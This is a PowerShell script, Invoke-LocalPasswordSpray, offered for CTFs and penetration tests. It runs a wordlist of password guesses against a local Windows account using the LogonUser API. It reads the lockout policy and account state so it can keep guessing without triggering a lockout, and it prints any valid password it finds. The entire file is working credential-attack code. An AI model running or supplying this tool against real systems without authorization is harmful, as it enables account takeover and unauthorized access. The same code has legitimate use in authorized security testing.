Function Invoke-LocalPasswordSpray {
<#
.SYNOPSIS
Performs local password spraying attack against a specified user account with guardrails.

.DESCRIPTION
Invoke-LocalPasswordSpray is designed to test a list of passwords against a local user account in a controlled manner to avoid account lockouts. 
It dynamically reads system lockout policy settings using "net accounts" and adapts its behavior accordingly. It may be a great addition to your toolset for CTF's or pentests where opsec does not matter too much.

Parameters can override default or system-derived values, and all timings are reflected back to the user for transparency.

.PARAMETER Username
The name of the local user account.

.PARAMETER PasswordList
The path to a file containing a list of passwords.

.PARAMETER LockoutThreshold
(Optional) Override the system-defined lockout threshold for failed login attempts.

.PARAMETER LockoutDuration
(Optional) Override the system-defined lockout duration in seconds.

.PARAMETER ObservationWindow
(Optional) Override the system-defined observation window in seconds.

.EXAMPLE
Invoke-LocalPasswordSpray -Username "admin" -PasswordList "C:\wordlists\common.txt"

.EXAMPLE
Invoke-LocalPasswordSpray -Username "test" -PasswordList ".\pwlist.txt" -LockoutThreshold 5 -LockoutDuration 1800

.LINK
https://github.com/0i41E
#>
param(
    [Parameter(Mandatory=$true)][string]$Username,
    [Parameter(Mandatory=$true)][string]$PasswordList,
    [int]$LockoutThreshold,
    [int]$LockoutDuration,
    [int]$ObservationWindow
)

# Retrieving lockout policy via net accounts - Not better method found yet which is not based on language and low privs
function Get-LockoutPolicy {
    $output = net accounts | Where-Object { $_.Trim() -ne "" }
    if ($output.Count -lt 8) {
        throw "[!] Unexpected output from 'net accounts'."
    }

    $policy = @{
        Threshold = 0
        Duration  = 0
        Window    = 0
    }

    try {
        $lineThreshold = $output[5]
        $lineDuration  = $output[6]
        $lineWindow    = $output[7]

        
        $policy.Threshold = [int]($lineThreshold -replace '[^\d]', '')
        # Convert minutes to seconds
        $policy.Duration  = [int]($lineDuration  -replace '[^\d]', '') * 60
        $policy.Window    = [int]($lineWindow    -replace '[^\d]', '') * 60
    }
    catch {
        throw "[!] Failed to parse lockout policy: $_"
    }

    return $policy
}

#Check current user status
function Get-UserStatus {
    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class UserInfo {
        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        public struct USER_INFO_4 {
            public string usri4_name;
            public string usri4_password;
            public uint usri4_password_age;
            public uint usri4_priv;
            public string usri4_home_dir;
            public string usri4_comment;
            public uint usri4_flags;
            public string usri4_script_path;
            public uint usri4_auth_flags;
            public string usri4_full_name;
            public string usri4_usr_comment;
            public string usri4_parms;
            public string usri4_workstations;
            public uint usri4_last_logon;
            public uint usri4_last_logoff;
            public uint usri4_acct_expires;
            public uint usri4_max_storage;
            public uint usri4_units_per_week;
            public IntPtr usri4_logon_hours;
            public uint usri4_bad_pw_count;
            public uint usri4_num_logons;
            public string usri4_logon_server;
            public uint usri4_country_code;
            public uint usri4_code_page;
            public IntPtr usri4_user_sid;
            public uint usri4_primary_group_id;
            public string usri4_profile;
            public string usri4_home_dir_drive;
            public uint usri4_password_expired;
        }

        [DllImport("Netapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern int NetUserGetInfo(
            string servername,
            string username,
            int level,
            out IntPtr bufptr
        );

        [DllImport("Netapi32.dll")]
        public static extern int NetApiBufferFree(IntPtr Buffer);
    }
"@

    $ptr = [IntPtr]::Zero
    $result = [UserInfo]::NetUserGetInfo($null, $Username, 4, [ref]$ptr)

    if ($result -eq 2221) {
        return @{ Exists = $false }
    }

    if ($result -ne 0 -or $ptr -eq [IntPtr]::Zero) {
        throw "[!] Error checking user status. Code: $result"
    }

    $info = [System.Runtime.InteropServices.Marshal]::PtrToStructure(
        $ptr, [Type][UserInfo+USER_INFO_4]
    )
    [UserInfo]::NetApiBufferFree($ptr)

    $flags = $info.usri4_flags
    return @{
        Exists = $true
        Enabled = ($flags -band 0x2) -eq 0
        Locked = ($flags -band 0x10) -ne 0
    }
}

#Performing authentication attempt to check for login - Should create event 4624 or 4625
function Try-Login {
    param (
        [string]$Username,
        [string]$Password
    )

    Add-Type @"
    using System;
    using System.Runtime.InteropServices;

    public class LogonHelper {
        [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
        public static extern bool LogonUser(
            string lpszUsername,
            string lpszDomain,
            string lpszPassword,
            int dwLogonType,
            int dwLogonProvider,
            out IntPtr phToken
        );

        [DllImport("kernel32.dll", CharSet=CharSet.Auto)]
        public static extern bool CloseHandle(IntPtr handle);
    }
"@

    $token = [IntPtr]::Zero
    $logonType = 2
    $provider = 0
    $domain = $env:COMPUTERNAME

    $success = [LogonHelper]::LogonUser($Username, $domain, $Password, $logonType, $provider, [ref]$token)
    Start-Sleep -Milliseconds 500

    if ($success) {
        [LogonHelper]::CloseHandle($token) | Out-Null
        return $true
    } else {
        return $false
    }
}

if (-not (Test-Path $PasswordList)) {
    Write-Host -ForegroundColor red "[!] Password file not found: $PasswordList"
    return
}

$userStatus = Get-UserStatus
if (-not $userStatus.Exists) {
    Write-Host -ForegroundColor Yellow "[?] User '$Username' does not exist."
    return
}
if (-not $userStatus.Enabled) {
    Write-Host -ForegroundColor Red "[!] User '$Username' is disabled."
    return
}
if ($userStatus.Locked) {
    Write-Host -ForegroundColor Red "[!] User '$Username' is currently locked out."
    return
}

$policy = Get-LockoutPolicy

$threshold = if ($PSBoundParameters.ContainsKey("LockoutThreshold")) { $LockoutThreshold } else { $policy.Threshold }
$duration  = if ($PSBoundParameters.ContainsKey("LockoutDuration"))  { $LockoutDuration  } else { $policy.Duration }
$window    = if ($PSBoundParameters.ContainsKey("ObservationWindow")){ $ObservationWindow} else { $policy.Window }

#Display current lockout policy
Write-Host  -foregroundColor yellow "Account Lockout Policy:"
Write-Host  -foregroundColor yellow ("  Threshold     : {0} {1}" -f $threshold, ($(if ($PSBoundParameters.ContainsKey("LockoutThreshold")) { "(manually set)" } else { "" })))
Write-Host  -foregroundColor yellow ("  Duration      : {0} seconds {1}" -f $duration, ($(if ($PSBoundParameters.ContainsKey("LockoutDuration")) { "(manually set)" } else { "" })))
Write-Host  -foregroundColor yellow ("  Observation   : {0} seconds {1}" -f $window, ($(if ($PSBoundParameters.ContainsKey("ObservationWindow")) { "(manually set)" } else { "" })))

if ($threshold -eq 0) {
    Write-Host -ForegroundColor Green "[+] No lockout policy defined (unlimited attempts)."
    $safeLimit = [int]::MaxValue
} else {
    $safeLimit = $threshold - 1
    if ($safeLimit -le 0) {
        Write-Host -ForegroundColor Yellow "[!] Only 1 attempt allowed — exiting to avoid lockout."
        return
    }
}

$attempts = 0
$passwords = Get-Content -Path $PasswordList -ErrorAction Stop

foreach ($pw in $passwords) {
    $attempts++
    Write-Host -ForegroundColor Cyan "[*] Trying password: $pw"

    if (Try-Login $Username $pw) {
        Write-Host -ForegroundColor Green "`n[+] Valid password found: $pw"
        break
    }

# Check if account is locked after the failed attempt - If failed attempts were made before this probably keeps the automation
    $userStatus = Get-UserStatus
    if ($userStatus.Locked) {
        Write-host -ForegroundColor Yellow "[?] Account is locked out - Maybe authentification attempts were made before. Waiting $duration seconds before continuing..."
        Start-Sleep -Seconds $duration
        $attempts = 0
        continue
    }

    # gUardrail to avoid user lockout
    if ($attempts -ge $safeLimit) {
        Write-host -ForegroundColor Yellow "[?] Safe attempt limit ($safeLimit) reached. Waiting for observation window ($window seconds)..."
        Start-Sleep -Seconds $window
        $attempts = 0
    }
}
}
